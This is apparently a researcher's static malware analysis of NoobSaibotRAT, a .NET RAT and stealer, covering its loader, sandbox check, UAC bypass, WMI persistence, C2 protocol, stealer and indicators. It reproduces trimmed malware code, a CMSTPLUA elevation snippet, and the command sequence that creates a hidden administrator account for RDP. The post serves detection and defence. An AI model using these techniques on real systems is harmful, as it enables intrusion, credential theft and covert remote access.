---
title: "NoobSaibotRAT's sandbox check averages its evidence, so a machine that fails every test gets through"
date: 2026-11-15T10:33:52+00:00
slug: "noobsaibotrat-evasion-average"
description: "A 165 MB .NET 8 single-file bundle, read statically: an AES loader, an unobfuscated RAT and stealer called AgentCore, a weighted 'EvasionBrain' that lets a machine showing all five sandbox signs run the payload, a UAC bypass with the wrong CLSID, the C2 protocol, two builds' configs, and an extractor."
tags: ["noobsaibotrat", "dotnet", "rat", "stealer", "single-file-bundle", "sandbox-evasion", "uac-bypass", "wmi-persistence", "hidden-rdp"]
sample:
  family: "NoobSaibotRAT (AgentCore), single-file bundle"
  sha256: "9c21d2e50468272329df31911ae3737e7b74a2db5ce33f5e0beccd36582d89c8"
  source: "[MalwareBazaar](https://bazaar.abuse.ch/sample/9c21d2e50468272329df31911ae3737e7b74a2db5ce33f5e0beccd36582d89c8/)"
toc: true
---

NoobSaibotRAT decides whether it is in a sandbox by adding up five weighted signals and dividing by the number of signals that fired. It exits when that average is above 0.7. Averaging only what fired means a weak signal pulls a strong one down: a machine with under 4 GB of RAM scores 0.8 and the RAT exits, but the same machine booted less than ten minutes ago scores (0.8 + 0.4) / 2 = 0.6 and the RAT runs. A machine that shows all five signs at once scores 0.69 and runs the payload too.

The check is one class, `EvasionBrain`, in a .NET 8 remote access tool and stealer whose own namespace is `AgentCore`. The sample I read is a 165 MB self-contained .NET single-file bundle uploaded to MalwareBazaar on 2026-10-23. Its submitter's comment says it arrived through LimeTorrents as a fake TV episode, `A Knight of the Seven Kingdoms S01E06 720p HMAX WEB-DL DDP.exe`, zero-padded to 2.3 GB, and that the upload is that file with the padding cut off. Threatray named the family in its [Threatray Tuesday list for 2026-10-13](https://github.com/threatray/threat-research/blob/main/ThreatrayTuesday/iocs-2026-10-13.md), with one hash, one C2 address and a link to Threatray's automated report. I found no public write-up of the family beyond that. Everything here comes from reading the files with dnfile, ILSpy and a few short Python scripts. No sample ran.

## What I found

- The bundle holds 468 files (154.8 MB): the .NET 8 runtime with the Windows Desktop libraries, a 386 KB loader assembly named `System Process`, and the libraries the RAT needs. The loader decrypts its only resource with AES-256-CBC under the key `eu1fA7JeiTnoipSdSTiKJFxMt8PYtbaq` and runs the result in memory. The result is AgentCore, which has no obfuscation at all. Its configuration strings are Base64 XORed with `NoobSaibot`.
- `EvasionBrain` lets the payload run in 18 of the 31 non-empty combinations of its five signals, including the one where all five are present.
- The build in the bundle tries to elevate through the CMSTPLUA COM object, but it asks for the CLSID `{3E5FC7F9-9735-4304-8133-F4A6359921b3}`. CMSTPLUA's CLSID is `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`. Only the interface ID is right.
- The C2 protocol is length-prefixed MessagePack inside TLS, with the server certificate pinned by SHA-1 thumbprint. After an RSA-OAEP key exchange, every packet is encrypted with AES-256-CBC (larger ones LZ4-compressed first), with an HMAC-SHA256 tag that uses the AES key as its MAC key. Both public builds pin the same certificate (`E5C3774B…34E9FD`) and use different C2 addresses.
- Eleven classes are never referenced, among them SOCKS, webcam, audio and registry modules. The Chrome DevTools password dumper runs JavaScript that always returns an empty list. Four of the 48 wallet extension IDs it looks for can't be Chrome extension IDs.

## A 2.3 GB download that is mostly zeros

MalwareBazaar tags the upload `padded`, and at 165 MB I expected filler inside it. There isn't any. I had read only the record's `comment` field, which is empty; the submitter's note is in the separate `comments` list, and it says the padding was there and has already been removed: the torrent delivered 2,312,863,971 bytes (SHA-256 `fbb8c5ad…`, not on Bazaar), and the upload is the first 165,380,323. What is left is a .NET single-file host: a native x64 `apphost` followed by a bundle whose manifest is located by a fixed 32-byte signature. The 8 bytes before that signature hold the manifest's offset. I parsed the manifest with a short script:

```console
$ python -I bundle.py bundle.exe
sig at 0x795228 header at 0x9db12fe
version 6 0 files 468 id 0JVwICCcGlMB
deps/rtcfg/flags (165308928, 43262, 10093568, 439, 0)
0x00942000    386048         0 t1 0db860c62ce8c95a System Process.dll
0x009a0400       439         0 t4 7e12cc5e51456d3f System Process.runtimeconfig.json
...
0x09a5f000    379392         0 t1 2804bfcecc8ec072 MessagePack.dll
0x09d8e000    100864         0 t1 b73b6b4d520f7323 Shared.dll
0x09da6a00     43262         0 t3 2f9cd25e6b2e6d5c System Process.deps.json
```

The columns are offset, size, compressed size (0 means stored), entry type and the first 16 hex digits of the SHA-256. The 468 entries add up to 154,828,109 bytes of a 165,380,323-byte file, and the longest run of zero bytes anywhere in it is 110,459 bytes. The size is the runtime: `runtimeconfig.json` lists both the base .NET runtime and the Windows Desktop runtime, version 8.0.24, so the bundle ships WPF and Windows Forms with their resources in 13 languages. The 2 GB of zeros on top keep the file away from scanners and sandboxes with size limits; the runtime is just what a self-contained .NET 8 app weighs.

The app's own files are few: `System Process.dll` (the loader), `Shared.dll`, MessagePack, an LZ4 library, SQLite, `System.Management` and `Microsoft.Win32.TaskScheduler`, which `deps.json` lists but nothing in AgentCore references. The submitter's comments name these parts and point out a 32-character key-like string in the loader. The loader is one class, `Loader.Bootstrap`:

```csharp {title="Loader.Bootstrap (System Process.dll), error handling removed"}
private static readonly string ENCRYPTION_KEY = "eu1fA7JeiTnoipSdSTiKJFxMt8PYtbaq";

private static async Task Main(string[] args)
{
    ShowWindow(GetConsoleWindow(), 0);
    byte[] array = LoadPayload();                     // (1)
    MethodInfo entryPoint = Assembly.Load(DecryptPayload(array, ENCRYPTION_KEY)).EntryPoint;
    ...entryPoint.Invoke(null, parameters)...         // (2)
}

private static byte[] DecryptPayload(byte[] encryptedData, string key)
{
    aes.Key = Encoding.UTF8.GetBytes(key.PadRight(32).Substring(0, 32));
    aes.Mode = CipherMode.CBC;
    aes.Padding = PaddingMode.PKCS7;
    Array.Copy(encryptedData, 0, array, 0, 16);       // (3)
    aes.IV = array;
    ...
}
```

(1) reads the manifest resource `Loader.Loader.data.bin`, 310,816 bytes. (3) takes the IV from its first 16 bytes; the rest is ciphertext. (2) runs the decrypted assembly's entry point inside the loader process, so the RAT never touches disk. The decrypted file is a 310,784-byte AnyCPU assembly, SHA-256 `2b43a722…`, with the PDB path `C:\Users\Administrator\Pictures\noobsaibot\AgentCore\obj\Release\net8.0\AgentCore.pdb`. The loader's own PDB path is under the same `noobsaibot` folder.

AgentCore references an assembly called `Shared` for its protocol and crypto. The loader doesn't need it, but the RAT does, and the bundle supplies it. Its PDB path is `...\Pictures\noobsaibot\Shared\obj\Release\net8.0\Shared.pdb`.

## Two builds, one certificate

The other public build is the hash Threatray listed, `63a9dd2e…`, a 282 KB AgentCore assembly submitted to Bazaar on its own on 2026-10-15. I call it the Threatray build and the one in the bundle the bundle build. I can't say which is older. The bundle build has more features (the UAC bypass, the DevTools stealer, autofill, 48 wallet IDs against 42), but the Threatray build has a reorganized `BrowserManager` class the other lacks, and the vendor first-seen dates on Bazaar disagree: Kaspersky first saw `63a9dd2e` on 2026-03-02, while ReversingLabs reports 2026-02-22 for both the bundle and its loader. The Threatray build's PDB path is `C:\Users\Administrator\Videos\finalfinallnoobsaibot\finallnoobsaibot\finallnoobsaibot\noobsaibot\topworkPnoobsaibot\Pnoobsaibot\noobsaibot\noobsaibot\AgentCore\...`, which tells its own story about how the project was versioned.

Both builds keep their settings in a static class, `AgentConfig`. Five of the values are encoded with `Obfuscator.Deobfuscate`, which is Base64 followed by a repeating XOR with the UTF-8 bytes of `NoobSaibot`:

```text
plain[i] = base64decode(s)[i] ^ "NoobSaibot"[i % 10]
```

| Field | 63a9dd2e (Threatray build) | 2b43a722 (bundle build) |
|---|---|---|
| `ServerHost` | 192.52.242[.]73 | 208.64.33[.]85 |
| `ServerPort` | 4445 | 4443 |
| `UseTLS` | true | true |
| `ServerCertificateThumbprint` | `E5C3774B…34E9FD` | same |
| `AuthToken` | `0KTtAYlDISW7JJjoe1FaXCe5YNaN0896` | `HNso5ZjU7in5vBAtUjdDPzb0Z2pbzhkf` |
| `MutexName` | `Global\{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}` | same |
| `PersistenceName` | `SystemHealthCheck` | same |
| `StartupDelay` (ms) | 1000 | 9000 |
| `EnableWMIPersistence` | false | true |
| `EnableUACBypass` | (no such field) | true |
| `EnableAIEvasion` | true | true |

Threatray lists this build's C2 as 192.52.242[.]79. The string in the file, `f1ZdTGZTR1BbRmBYXA==`, decodes to `192.52.242.73`, and the only other IP address in the assembly is `127.0.0.1`, used by a test mode. I can't tell whether Threatray's sandbox saw a different connection or whether the last digit is a typo.

The same thumbprint in both builds means one server certificate behind two IP addresses. That is the best pivot this family offers: a TLS scan for that certificate would find other servers from the same panel.

Each build also carries a handful of fields that nothing reads, with names like `ai_61802304` and random small values:

```csharp {title="AgentConfig, start of the bundle's build"}
public static string ai_61802304 = "371";
private static bool ai_8afac2aa = true;
private static string _serverPortStr = Obfuscator.Deobfuscate("eltbUQ==");
public static string ai_29db58ed = "992";
public static string ai_9931d815 = "901";
```

The Threatray build has eleven of them and the bundle build nine, with no names in common. They change the assembly's hash and metadata from build to build without changing its behaviour. The `EncryptKeylogs`, `HiddenMode` and `EnableAntiDetection` settings are never read either.

## The evasion brain

Unless it was started with `--test-hvnc`, `AgentEntry.Main` asks `EvasionBrain.Decide` first (when `EnableAIEvasion` is set, as in both builds) and returns if it says yes. This is the whole decision, with the helper methods left out:

```csharp {title="AgentCore.Core.AI.EvasionBrain (trimmed)"}
private readonly Dictionary<string, float> _weights = new() {
    { "LowRAM", 0.8f }, { "LowCPU", 0.7f }, { "SandboxProcess", 0.95f },
    { "SmallDisk", 0.6f }, { "ShortUptime", 0.4f } };

public float Analyze(object input)
{
    float num = 0f; int num2 = 0;
    if (GetTotalRAMGb() < 4.0)           { num += _weights["LowRAM"]; num2++; }
    if (Environment.ProcessorCount < 2)  { num += _weights["LowCPU"]; num2++; }
    if (IsSandboxProcessRunning())       { num += _weights["SandboxProcess"]; num2++; }
    if (GetMainDiskSizeGb() < 60.0)      { num += _weights["SmallDisk"]; num2++; }
    if (GetUptimeMinutes() < 10.0)       { num += _weights["ShortUptime"]; num2++; }
    if (num2 == 0) return 0f;
    return Math.Clamp(num / (float)num2, 0f, 1f);   // (1)
}

public bool Decide(object input) => Analyze(input) > 0.7f;   // (2)
```

The "sandbox processes" are `wireshark`, `vboxservice`, `vboxtray`, `x64dbg`, `ida64`, `processhacker` and `httpdebugger`, compared against lowercase process names. RAM comes from WMI's `Win32_PhysicalMemory`, disk size from drive C.

See if you can spot the problem before reading on.

(1) divides by the number of signals that fired, not by five or by the total weight. The score is the mean weight of whatever fired, so it measures how strong the average clue is, not how many clues there are. Every extra weak clue lowers it. (2) is a strict comparison, so a weight of exactly 0.7 isn't enough on its own.

My first table of all 31 combinations summed the weights as `float32` but compared the result with Python's 0.7, a double. That happened to give the right answers, for the wrong reason, so I redid it with the comparison in `float32` too, adding in the code's order. The type matters here: in pure doubles, LowRAM + LowCPU + SmallDisk is 0.7000000000000001 and exits, while in `float32` it equals `0.7f` and runs. These are the cases worth knowing:

| Signals present | Score | Result |
|---|---|---|
| LowRAM | 0.80 | exits |
| SandboxProcess | 0.95 | exits |
| LowCPU | 0.70 | runs (not above 0.7) |
| LowRAM + ShortUptime | 0.60 | runs |
| SandboxProcess + ShortUptime | 0.675 | runs |
| LowRAM + SmallDisk | 0.70000005 | exits |
| LowRAM + LowCPU + SmallDisk | 0.69999999 | runs |
| all five | 0.69 | runs |

The payload exits in 13 combinations and runs in 18. ShortUptime, with a weight of 0.4, is the most useful signal a sandbox can show: when it fires with any one other signal, the RAT runs. A VM with Process Hacker running, a disk under 60 GB and less than ten minutes of uptime scores 0.65 and gets the payload; the same VM without the small disk and the fresh boot scores 0.95 and doesn't.

The weights and threshold are in the IL as `ldc.r4` constants (`0.8`, `0.7`, `0.95`, `0.6`, `0.4`, and `0.7` before the `cgt`), so the table above is what the JIT will compute.

## A UAC bypass with the wrong class

The bundle build then tries to elevate if it isn't an administrator. `PrivilegeEscalator.Elevate` is a C# copy of the well-known CMSTPLUA technique, which [UACME](https://github.com/hfiref0x/UACME) documents: bind to an auto-elevating COM object through the `Elevation:Administrator!new:` moniker, then call its `ShellExec` method to start the current executable elevated.

```csharp {title="PrivilegeEscalator.Elevate (trimmed)"}
Guid riid = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");               // (1)
pBindOptions.dwClassContext = 4u;                                           // CLSCTX_LOCAL_SERVER
if (CoGetObject("Elevation:Administrator!new:{3E5FC7F9-9735-4304-8133-F4A6359921b3}",
                ref pBindOptions, riid, out var ppv) == 0 && ppv != IntPtr.Zero)   // (2)
{
    int num = ((ICMLuaUtil)Marshal.GetObjectForIUnknown(ppv)).ShellExec(text, "", null, 0u, 0u);
    if (num >= 0) Environment.Exit(0);
}
```

I took this for a working copy at first, because (1) matches UACME's `IID_ICMLuaUtil` in `comsup.h` byte for byte, and the C# interface declares six placeholder methods before `ShellExec`, which puts it in the right vtable slot (UACME's `elvint.h` has six methods between `Release` and `ShellExec`). Then I checked the CLSID in (2) against UACME's `consts.h`, which defines `T_CLSID_CMSTPLUA` as `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`. The first eight hex digits match and the rest don't. I found the sample's CLSID in no public source, with the same mixed case (`...F4A6359921b3`) or without it. Unless something on the victim registers that class, `CoGetObject` fails, `Elevate` returns false, and the RAT carries on with the token it started with.

That matters for the next step. `AdvancedPersistence.InstallWMIPersistence` creates a permanent WMI event subscription in `root\subscription`:

| Object | Name | Value |
|---|---|---|
| `__EventFilter` | `__SystemHealthCheckFilter` | `SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'` |
| `CommandLineEventConsumer` | `__SystemHealthCheckConsumer` | `CommandLineTemplate` = the running executable's path |
| `__FilterToConsumerBinding` | | binds the two |

The performance counters in `Win32_PerfFormattedData_PerfOS_System` change all the time, so the filter fires at every 300-second poll and starts the RAT again; the mutex stops duplicates. Writing to `root\subscription` needs administrator rights, and the code swallows the exception. I think, from the code rather than a test, that on a default Windows install with UAC on, the bundle build gets neither elevation nor persistence unless the victim starts it from an elevated prompt.

The Threatray build doesn't try either: it has no `PrivilegeEscalator` class and ships with `EnableWMIPersistence = false`, in which case `Main` calls `RemoveWMIPersistence` instead.

The agent's ID is stable per user. `EnvironmentProbe.GetHWID` hashes the processor ID, disk serial, board serial and a fresh random GUID with SHA-256, then stores the result as `HWID` under `HKCU\Software\noobsaibotRAT` and reuses it from there on.

## The protocol

`ConnectionHandler.ConnectAsync` opens a TCP connection to `ServerHost:ServerPort` and wraps it in TLS. The certificate check ignores the chain and the name. It accepts the server only if `GetCertHashString()`, the SHA-1 of the certificate, equals the configured thumbprint. (If the thumbprint were the string `PLACEHOLDER` it would accept a certificate with name or chain errors, but neither build uses that.)

Every message on the wire is a 4-byte little-endian length followed by a MessagePack array:

| Key | Field | Type | Notes |
|---|---|---|---|
| 0 | `Type` | byte | `PacketType` enum, below |
| 1 | `Id` | string | a new GUID per packet |
| 2 | `Timestamp` | int64 | Unix milliseconds |
| 3 | `Data` | bytes | MessagePack of the inner object, wrapped as below |
| 4 | `Compressed` | bool | |
| 5 | `Encrypted` | bool | |

A non-empty `Data` is always wrapped by `CompressionManager.CompressWithMetadata`: a bool, the original length if the bool is true, the stored length, then the bytes. Payloads of 1,024 bytes or more go through LZ4 (level 12) if the result is under 90% of the original.

The key exchange happens inside TLS, in three `KeyExchange` (type 1) packets:

1. The agent sends `ClientId` (the HWID), `Version` (`1.0.0`) and `AuthToken`.
2. The server answers with a `SessionId` and an RSA public key, Base64 of a PKCS#1 `RSAPublicKey`.
3. The agent generates an AES-256 key and an IV, encrypts each with RSA-OAEP-SHA256, and sends both with the session ID.

From then on each `Data` field, after the compression wrapper, is:

```text
ct  = IV || AES-256-CBC(key, IV, PKCS7(data))      IV fresh per packet
out = HMAC-SHA256(key, ct) || ct
```

The same 32 bytes are the AES key and the HMAC key, and the IV sent in step 3 is never used, since `CryptoManager.Encrypt` generates a new IV for every packet. Neither choice breaks anything here: TLS with a pinned certificate already covers the channel, and the inner layer only adds work. The auth token travels under TLS alone, so anyone who has the server's private key or controls the server sees it.

After the exchange the agent sends `ClientInfo` (type 10): HWID, computer and user names, OS, CPU, GPU, RAM, admin flag, camera flag, and the public IP and country code from `hxxp://ip-api[.]com/json/`. The packet class also has fields for an antivirus flag and name, installed software and `BlockchainResolved`, which this agent never fills.

## Twenty commands

`Ping` (2) gets a `Pong` (3), `Disconnect` (4) stops the agent, `RemoteDesktop` (101) carries mouse and keyboard input for the live screen, and `Command` (20) carries a MessagePack `CommandPacket`: an ID, a name and a dictionary of arguments. The answer comes back as `CommandResult` (21). Both builds accept the same 20 names:

| Command | Arguments | What it does |
|---|---|---|
| `shell` | `command` | `cmd.exe /c`, returns stdout and stderr |
| `getprocesses` | | process list as JSON |
| `killprocess` | `pid` | kills a process |
| `getfiles` | `path` | directory listing |
| `downloadfile` | `path` | returns a file |
| `download_chunked` | `path`, `chunk_size` | sends a file in chunks, 524,288 bytes by default |
| `uploadfile` | `path`, `data` | writes a file |
| `executefile` | `path` | starts a file |
| `deletefile` | `path` | deletes a file |
| `screenshot` | | one screenshot |
| `remotedesktop_start` | `fps`, `quality` | streams the screen as type 101 packets |
| `remotedesktop_stop` | | stops the stream |
| `hvnc_start` | `dll_data`, `ip`, `port` | loads a hidden-desktop DLL sent as Base64 and calls `noobsaibotRAT.HVNC.EntryPoint.Start(ip, port, hwid)`; port 4448 by default |
| `hvnc_stop` | | calls `EntryPoint.Stop` |
| `keylogger_start` / `_stop` | | low-level keyboard hook (`WH_KEYBOARD_LL`) |
| `getkeylogs` | | returns the buffer |
| `stealdata` | `mode`, `enable_hrdp` | runs the stealer, below |
| `hrdp` | `username`, `password` | creates a hidden administrator account and opens RDP |
| `hrdp_check` | `username` | reports the RDP settings and the account's groups |

The HVNC module isn't in either build or in the bundle; the server sends it on demand. A leftover `--test-hvnc` mode in `Main` loads `noobsaibotRAT.HVNC.dll` from the current directory, connects it to `127.0.0.1:4448` and writes progress to `C:\agent_debug.txt`. That is the author's test mode, still in the shipped build.

## The stealer and the hidden account

`stealdata` collects passwords (Chromium browsers and Firefox), cookies, cards, wallet extensions and desktop wallets, Discord tokens, Telegram sessions, saved Wi-Fi passwords, files with eleven extensions (`.txt`, `.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.key`, `.kdbx`, `.wallet`, `.dat`, `.json`) in the top level of Documents and Desktop, the keylogger buffer and a screenshot; the bundle build adds Chromium autofill. With `mode=json` it returns everything in the command result. By default it writes a folder under `%TEMP%\stolen_<8 hex>`, zips it to `%TEMP%\stolen_<8 hex>.zip` and returns the path and a wallet count, which the operator then pulls with `download_chunked`. Wallet files are staged under `%TEMP%\noobsaibotRAT_Stealer\Wallets\`.

For Chrome's app-bound cookie encryption, `AppBoundDecryptor` is a C# port of the public method from [runassu's chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption): impersonate SYSTEM with a token taken from `lsass.exe`, DPAPI-decrypt the key as SYSTEM and then as the user, then unwrap it with the hard-coded AES key for flag 1 or the `Google Chromekey1` CNG key and XOR mask for flag 3. It needs administrator rights, which brings us back to the broken elevation.

The bundle build adds `ModernBrowserStealer`, which kills the browser, starts it again with `--remote-debugging-port=9222 --user-data-dir="..." --headless=new` and asks the DevTools endpoint for `Network.getAllCookies`. Its password half opens `chrome://password-manager/passwords` and evaluates this, trimmed:

```javascript {title="DumpPasswordsAsync, the injected script (trimmed)"}
// Attempting to find the password data via internal elements
// Note: Chrome 127+ might require an OS prompt for 'Show Password'
// but often the metadata (labels/usernames) is still scrapable.
let passwords = [];
// Real implementation would look for 'password-list-item' or similar
return passwords;
```

It always returns an empty list. The cookie half works; the password half is a placeholder that shipped.

The bundle build's wallet list maps 48 Chromium extension IDs to wallet names. Chrome extension IDs are 32 characters from `a` to `p`. Four of these aren't: `tnodbkphfksbohkjoaofmohpiihiiecg` (ZilPay), `jojhfeoedhimlniiindguhoemlgnpanj` (Coin98) and `ajkjbifugfcgbneefkimpphjpjflhcoh` (Leap) contain letters after `p`, and `nadhfocjmapmjenopiabofmjjbfnand` (Solflare_Alt) is 31 characters long. Those four entries can never match a folder.

With `enable_hrdp=true`, or through the `hrdp` command, `HrdpManager.EnableHRDP` turns a stolen machine into an RDP server:

```text
HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server  fDenyTSConnections=0, fSingleSessionPerUser=0
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user <user> <password> /add
net localgroup Administrators <user> /add
net localgroup "Remote Desktop Users" <user> /add
HKLM\...\Winlogon\SpecialAccounts\UserList  <user>=0      (hides it from the logon screen)
wmic useraccount where name="<user>" set PasswordExpires=FALSE
```

From `stealdata` the user is `Support_` plus five hex digits and the password is twelve hex digits followed by `!`. From the `hrdp` command without arguments the user is `Admin` and the password the first eight characters of a GUID. The credentials go back in the result and, from the stealer, in a log packet. All of this needs administrator rights too.

## Code that was written and never wired in

After seeing modules with no command, I checked which AgentCore classes any other class references. My first pass searched the IL for `Class::Method` tokens and missed constructors, because `.ctor` doesn't match `\w+`, so it also listed `LsassImpersonator` as unused; `AppBoundDecryptor` does create it with `new`. The second pass counts any mention of the type name outside its own class. In the bundle build, eleven classes have none: `SocksModule`, `WebcamModule`, `AudioRecorderModule`, `RegistryModule`, `ShellModule`, `FileManagerModule`, `ProcessManagerModule`, `DiscordStealer`, `AntiAnalysis`, `DesktopApi` and the `HVNCCommand` enum. The protocol's `PacketType` enum has values for Netstat, Webcam, Audio, Registry and Thumbnails that no code sends, and `HandleHVNC` is an empty method. `AntiAnalysis`, a second anti-VM class, is in both builds and called by neither. `SelfDelete` in `AgentEntry` writes a batch file that deletes the executable, and nothing calls it.

The mix of a class called `EvasionBrain`, an interface called `IEngine` in a `Shared.AI` namespace, `ai_` junk fields, a placeholder comment in shipped JavaScript, four impossible extension IDs and a CLSID that is right for eight digits makes me think, with medium confidence, that much of this code was produced with a code-generation assistant and not tested on a real target. It doesn't make the working parts harmless: the shell, file transfer, keylogger, cookie theft, screen streaming and hidden RDP account all work as written, as far as static reading can tell.

## What I couldn't determine

- The torrent and the padded 2.3 GB file. Both are known only from the Bazaar submitter's comment; the padded file isn't on Bazaar, and nothing in the bundle mentions a torrent.
- The HVNC DLL, which only the server has.
- Whether either C2 answered at any point, and why Threatray's address ends in .79.
- Whether the CLSID `{3E5FC7F9-9735-4304-8133-F4A6359921b3}` is registered anywhere. I found it in no public source and I didn't test on Windows.

## The extractor

[`families/noobsaibot/extract.py`](https://github.com/stateless-re/tools/tree/main/families/noobsaibot) takes a single-file bundle, the loader assembly or an AgentCore assembly. It parses the bundle manifest, finds the loader's AES key by trying each user string against the resource until the result starts with `MZ`, walks the IL of `AgentConfig`'s static constructor, and decodes the `Obfuscator` strings with the key it finds in `Obfuscator.Deobfuscate`. The output is JSON: config, encoded originals, junk fields, PDB path and the hashes of the app's files in the bundle. `-o DIR` writes the decrypted AgentCore assembly.

## Indicators

| SHA-256 | Role |
|---|---|
| `fbb8c5ada102267861724bcee47aaae29882ffae0ee775c8734e059182d38f8f` | Padded download `A Knight of the Seven Kingdoms S01E06 720p HMAX WEB-DL DDP.exe` (from the Bazaar submitter's comment) |
| `9c21d2e50468272329df31911ae3737e7b74a2db5ce33f5e0beccd36582d89c8` | Single-file bundle, the download without padding (MalwareBazaar) |
| `0db860c62ce8c95ae3018ef4ded4711bc212d9bd54d4da1063da18790dbecac8` | Loader `System Process.dll`, in the bundle and on MalwareBazaar |
| `2b43a7225c4c4e4912cc7cfffac04356b84ee0c5bdceed4d32c6d0111d4bfa58` | AgentCore, decrypted from the loader (not on Bazaar) |
| `b73b6b4d520f7323259155fad99618e06dfed5c6e8fa0accee7326a8f84cb779` | `Shared.dll` from the bundle (not on Bazaar) |
| `63a9dd2ea552fbb84afdec77884f88cc3dc86c26c257a23c465905f218c5d27e` | AgentCore, Threatray build (MalwareBazaar, Threatray) |

Network:

| Indicator | Context |
|---|---|
| 208.64.33[.]85:4443 | C2, build in the bundle |
| 192.52.242[.]73:4445 | C2, Threatray build |
| 192.52.242[.]79 | C2 listed by Threatray for that build |
| TLS certificate SHA-1 `E5C3774B55EE3002093D8D5223A805C4B434E9FD` | pinned by both builds |
| hxxp://ip-api[.]com/json/, hxxps://api.ipify[.]org | IP and country lookups |
| TCP 4448 | default HVNC port |

Host:

| Indicator | Context |
|---|---|
| Mutex `Global\{A1B2C3D4-E5F6-7890-1234-56789ABCDEF0}` | both builds |
| `HKCU\Software\noobsaibotRAT`, value `HWID` | agent ID |
| WMI `__SystemHealthCheckFilter`, `__SystemHealthCheckConsumer` in `root\subscription` | persistence (bundle build) |
| `%TEMP%\stolen_<8 hex>.zip`, `%TEMP%\noobsaibotRAT_Stealer\` | stealer staging |
| `%TEMP%\<32 hex>.tmp` | keylogger offline cache, plain text |
| Browser started with `--remote-debugging-port=9222 --headless=new` | cookie theft over DevTools |
| Local admin `Support_<5 hex>` or `Admin` listed under `Winlogon\SpecialAccounts\UserList` | hidden RDP account |
| `C:\agent_debug.txt` | `--test-hvnc` debug log |

Microsoft Defender has a signature, `Trojan:MSIL/SpyAgent.E!AMTB`, built on AgentCore strings such as `noobsaibotRAT.HVNC.dll` and `noobsaibotRAT_Stealer` (as published in the [defender2yara dump](https://github.com/mthcht/awesome-lists/blob/main/Lists/Others/Defender_yara_rules/MSIL/Trojan/SpyAgent.yara)). In the bundle those strings exist only AES-encrypted, and the dumped rule also requires a file under 20 MB.

## ATT&CK

| ID | Technique | How |
|---|---|---|
| T1027.013 | Encrypted/Encoded File | AES-256-CBC resource in the loader; Base64+XOR config strings |
| T1620 | Reflective Code Loading | `Assembly.Load` of the decrypted AgentCore |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | `EvasionBrain` RAM, CPU, process, disk and uptime checks |
| T1548.002 | Bypass User Account Control | CMSTPLUA elevation moniker, with a wrong CLSID |
| T1546.003 | WMI Event Subscription | `__SystemHealthCheckFilter` and `CommandLineEventConsumer` |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | pinned TLS, RSA-OAEP key exchange, AES-CBC with HMAC |
| T1059.003 | Windows Command Shell | `shell` command |
| T1056.001 | Keylogging | `WH_KEYBOARD_LL` hook |
| T1555.003 | Credentials from Web Browsers | Chromium and Firefox stores, app-bound key unwrap |
| T1539 | Steal Web Session Cookie | SQLite and DevTools `Network.getAllCookies` |
| T1134.001 | Token Impersonation/Theft | SYSTEM token from `lsass.exe` for DPAPI |
| T1136.001 | Create Account: Local Account | `net user ... /add` |
| T1564.002 | Hidden Users | `SpecialAccounts\UserList` value 0 |
| T1021.001 | Remote Desktop Protocol | `fDenyTSConnections=0`, firewall group enabled |
| T1113 | Screen Capture | `screenshot`, `remotedesktop_start` |
| T1041 | Exfiltration Over C2 Channel | `download_chunked` of the stealer zip |

## Ending

`EvasionBrain` was written to look careful, with weights, a normalized score and a threshold. Averaging only the signals that fired turns it upside down, and a CLSID that shares only its first eight digits with CMSTPLUA's does the same to the elevation. What remains, and works, is a plain RAT that pins one certificate across builds and leaves a mutex, a registry key and a `__SystemHealthCheck` WMI subscription behind. Those are the things to look for.

## Credits and further reading

- Threatray, [Threatray Tuesday IoCs, 2026-10-13](https://github.com/threatray/threat-research/blob/main/ThreatrayTuesday/iocs-2026-10-13.md), which named NoobSaibotRAT and the `63a9dd2e` build.
- The anonymous MalwareBazaar submitter of the [bundle](https://bazaar.abuse.ch/sample/9c21d2e50468272329df31911ae3737e7b74a2db5ce33f5e0beccd36582d89c8/) and the [loader](https://bazaar.abuse.ch/sample/0db860c62ce8c95ae3018ef4ded4711bc212d9bd54d4da1063da18790dbecac8/), whose comments give the delivery, the padding and the bundle's parts; and the submitter of the [Threatray build](https://bazaar.abuse.ch/sample/63a9dd2ea552fbb84afdec77884f88cc3dc86c26c257a23c465905f218c5d27e/).
- hfiref0x, [UACME](https://github.com/hfiref0x/UACME), for the CMSTPLUA CLSID, the ICMLuaUtil IID and its vtable.
- runassu, [chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption), the method AgentCore's app-bound decryptor follows.
- The .NET team's [single-file bundler design](https://github.com/dotnet/designs/blob/main/accepted/2020/single-file/bundler.md), which describes the header marker and manifest.
